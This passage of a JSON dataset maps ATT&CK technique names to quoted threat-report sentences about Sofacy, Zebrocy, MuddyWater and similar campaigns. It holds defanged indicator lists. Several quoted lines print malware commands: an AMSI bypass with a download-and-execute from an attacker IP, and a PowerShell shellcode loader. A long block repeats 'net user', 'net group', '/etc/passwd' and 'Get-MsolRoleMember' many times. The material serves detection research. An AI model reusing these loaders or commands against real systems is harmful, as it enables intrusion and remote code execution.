0utl00k[.]net msdncss[.]com 0ffice[.]com 0ffiice[.]com micrrosoft[.]net anyconnect[.]stream bigip[.]stream  fortiweb[.]download  kaspersky[.]science  microtik[.]stream  owa365[.]bid  symanteclive[.]download  windowsdefender[.]win allexa[.]net kaspersky[.]host hotmai1[.]com 0utlook[.]bid",
        "Message 2:    Headers Received: by mailcenter.support   Sender Council on Foreign Relations <webprint@fprii.net>   Subject The Four Traps China May Fall Into   Body Content and images included within the e-mail body were a direct copy of the following CFR article: https://www.cfr.org/blog/four-traps-china-may-fall   Notes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL  hxxp://fprii.net/The_Four_Traps_for_China.doc",
        "IOCs Domain supservermgr[.]com URL hxxp://supservermgr[.]com/sys/upd/pageupd.php Zebrocy d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df 25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8 115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03 f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1 5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2 dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d Koadic abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca User Agents Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 IPs 185.25.51[.]198 185.25.50[.]93 220.158.216[.]127 92.114.92[.]102 86.106.131[.]177  DDE Docs 85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5 8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff",
        "Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network",
        "It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system",
        "With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain",
        "The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information",
        "The shareDll32 module then enumerates and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameW",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        "net user ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net group ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " /etc/passwd ",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember",
        " Get-MsolRoleMember"
    ],
    "system information discovery process discovery data encoding-multi": {
        "technique_names": [
            "system information discovery",
            "process discovery",
            "data encoding"
        ],
        "sentances": [
            "The VB.NET variant then gathers system information and running processes like other Zebrocy variants by running the following commands: systeminfo & tasklist The URL used to send the system information, running processes and a screenshot to the C2 server is: hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php?res=[serial number] The VB.NET variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows (notice the spaces before and after ampersand \u201c&\u201d): data=[system information and running processes] & arg=[screenshot in BMP format] C# Zebrocy Variant The C# variant of Zebrocy is similar to other variants in functionality, but also has several unique attributes that are worth discussing"
        ]
    },
    "windows management instrumentation process discovery exfiltration over command and control channel-multi": {
        "technique_names": [
            "windows management instrumentation",
            "process discovery",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "The tool runs the following list of WMI queries:  wmic logicaldisk get Caption, Description,VolumeSerialNumber,Size,FreeSpace wmic diskdrive get Model, SerialNumber wmic computersystem get Manufacturer, Model, Name, SystemTypec wmic os get Caption, OSArchitecture, OSLanguage,SystemDrive,MUILanguages wmic process get Caption,ExecutablePath  The URL used to send the system information, running processes and a screenshot to the C2 server is: hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php?fm=[serial number] The C# variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows: spp=[system information from WMI queries] &spvg=[screenshot in JPEG format] Conclusion The Sofacy group continues their attacks on organizations across the globe using similar tactics and techniques"
        ]
    },
    "spearphishing link standard application layer protocol spearphishing attachment fallback channels-multi": {
        "technique_names": [
            "spearphishing link",
            "standard application layer protocol",
            "spearphishing attachment",
            "fallback channels",
            "arp"
        ],
        "sentances": [
            "Palo Alto Networks customers are protected by attacks discussed in this blog by:  All delivery documents and payloads discussed are detected with malicious verdicts in WildFire Traps blocks the macro laden documents as Suspicious macro detected \u00a0C2 URLs have been classified as Command and Control AutoFocus customers may learn more via the Zebrocy and Cannon tags  Indicators of Compromise Delivery Hashes 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f c20e5d56b35992fe74e92aebb09c40a9ec4f3d9b3c2a01efbe761fa7921dd97f abfc14f7f708f662046bfcad81a719c71a35a8dc5aa111407c2c93496e52db74 40318f3593bca859673827b88d65c5d2f0d80a76948be936a60bda67dff27be9 5749eb9d7b8afa278be24a4db66f122aeb323eaa73a9c9e52d77ac3952da5e7d af77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392 34bdb5b364358a07f598da4d26b30bac37e139a7dc2b9914debb3a16311f3ded 79bd5f34867229176869572a027bd601bd8c0bc3f56d37443d403a6d1819a7e5 77ff53211bd994293400cb3f93e3d3df6754d8d477cb76f52221704adebad83a Remote Template Hashes f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5 86bb3b00bcd4878b081e4e4f126bba321b81a17e544d54377a0f590f95209e46 2da5a388b891e42df4ed62cffbc167db2021e2441e6075d651ecc1d0ffd32ec8 0d7b945b9c912d205974f44e3742c696b5038c2120ed4775710ed6d51fbc58ef fc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d ed8f52cdfc5f4c4be95a6b2e935661e00b50324bee5fe8974599743ccfd8daba b9f3af84a69cd39e2e10a86207f8612dd2839873c5839af533ffbc45fc56f809 Remote Template URLs hxxp://188.241.58[.]170/live/owa/office.dotm hxxp://185.203.118[.]198/documents/Note_template.dotm hxxp://185.203.118[.]198/documents/Note_template.dotm hxxp://145.249.105[.]165/doc/temp/release.dotm hxxp://145.249.105[.]165/messages/content/message_template.dotm hxxp://188.241.58[.]170/version/in/documents.dotm hxxp://109.248.148[.]42/officeDocument/2006/relationships/templates.dotm hxxp://109.248.148[.]42/office/thememl/2012/main/attachedTemplate.dotm hxxp://109.248.148[.]42/office/thememl/2012/main/attachedTemplate.dotm Zebrocy\u00a0Hashes 5173721f3054b92e6c0ff2a6a80e4741aa3639bc1906d8b615c3b014a7a1a8d7 61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e 6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a 9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9 b41480d685a961ed033b932d9c363c2a08ad60af1d2b46d4f78b5469dc5d58e3 c91843a69dcf3fdad0dac1b2f0139d1bb072787a1cfcf7b6e34a96bc3c081d65 e5aece694d740ebcb107921e890cccc5d7e8f42471f1c4ce108ecb5170ea1e92 Zebrocy\u00a0C2 URLs hxxp://188.241.58[.]170/local/s3/filters.php hxxp://185.203.118[.]198/en_action_device/center_correct_customer/drivers-i7-x86.php hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php Cannon Hashes 861b6bc1f9869017c48930af5848930dd037fb70fc506d8a7e43e1a0dbd1e8cb 4405cfbf28e0dfafa9ea292e494f385592383d2476a9c49d12596b8d22a63c47 174effcdeec0b84c67d7dc23351418f6fa4825550d595344214cc746f1a01c1a a23261e2b693750a7009569df96ec4cf61e57acc9424c98d6fe1087ff8c659ce 651d5aab82e53711563ce074c047cbaa0703931673fa3ad20933d6a63c5c3b12 68df0f924ce79765573156eabffee3a7bb0fa972d2b67d12dd91dea3ec255d24 61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e 5a02d4e5f6d6a89ad41554295114506540f0876e7288464e4a70c9ba51d24f12 d06be83a408f4796616b1c446e3637009d7691c131d121eb165c55bdd5ba50b4 78adc8e5e4e86146317420fa3b2274c9805f6942c9973963467479cb1bbd4ead 054c5aa73d6b6d293170785a82453446429c0efc742df75979b760682ac3026b cac630c11c4bf6363c067fbf7741eae0ec70238d9c5e60d41f3ed8f65b56c1d1 ecc5805898e037c2ef9bc52ea6c6e59b537984f84c3d680c8436c6a38bdecdf4 215f7c08c2e3ef5835c7ebc9a329b04b8d5215773b7ebfc9fd755d93451ce1ae Cannon Related Emails sym777.g[at]post.cz kae.mezhnosh[at]post.cz vebek.morozh30[at]post.cz g0r7tsa45s[at]post.cz marvel.polezha[at]post.cz sahro.bella7[at]post.cz trala.cosh2[at]post.cz Bishtr.cam47[at]post.cz Lobrek.chizh[at]post.cz Cervot.woprov[at]post.cz heatlth500[at]ambcomission[.]com trash023[at]ambcomission[.]com trasler22[at]ambcomission[.]com rishit333[at]ambcomission[.]com tomasso25[at]ambcomission[.]com kevin30[at]ambcomission[.]com"
        ]
    },
    "powershell": [
        "Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory",
        "Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015",
        "Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the \u201cCommandLineTemplate.\u201d      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here",
        "Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment",
        "However, in this new variant, all the DNS activity is initiated and executed solely from memory \u2013 unlike previous attacks which used PowerShell commands",
        "The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process",
        "The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker\u2019s server",
        "(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim\u2019s system once the PowerShell implant is executed",
        "The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line: powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\\\ProgramData\\\\WindowsDefender.ini) The rest of the malicious activities are performed by the PowerShell Script",
        "PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality",
        "Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections",
        "Section 1 The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:  TEMpPAtH = \"C:\\ProgramData\\\" (the path used for storing the temp files) Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine) FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = \"HKLM:\\Software\\\" Hkcu = \"HKCU:\\Software\\\" ValuE = \"kaspersky\" SYSID DrAGon_MidDLe = [array of proxy URLs]  Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12",
        "The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server",
        "The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques",
        "On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system",
        "The PowerShell command decodes to the following:$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')          {                          $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command             IEX $exec         }         else         {             $exec = [System.Convert]::FromBase64String($command)             $exec = [Text.Encoding]::Unicode.GetString($exec)             IEX $exec         }The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};     try{      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)     }catch{}     IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');This decoded PowerShell script attempts to download and execute a file using HTTP from the URL \u201chxxp:// 139.59.46[.]154:3485 /IMo8oosieVai\u201d",
        "In the example above, the \u201cspp.exe\u201d executable would be added to an auto-run registry key at: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplore Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key \u201cagkrhfpdbvhdhrkj\u201d; however, the loader\u2019s main goal involved running the following command:/c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsA&lt;snip&gt;The base64 encoded command decodes to the following:$0o8e = '$f9B = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = &lt;shellcode REDACTED for brevity&gt;;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = \"-enc \";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"&amp; $b32 $DKn $e\"}else{;iex \"&amp; powershell $DKn $e\";}The decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it",
        "Upon execution in a vulnerable environment, the PowerShell based payload takes over",
        "The PowerShell script is responsible for downloading the final payload from C2 server to execute it",
        "Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)",
        "Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes",
        "Lock PowerShell Execution Policy, must be set to \u201cAllSigned\u201d via GPO",
        "These PowerShell scripts are final stage payloads \u2013 they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.\u00a0 hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server",
        "The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d) \u00a0contains the following formula that Excel will save to the \u201cA0\u201d cell in the worksheet:  The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1",
        "The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool",
        "It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe \"Office365DCOMCheck.vbs\" \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>\"     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload",
        "The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops",
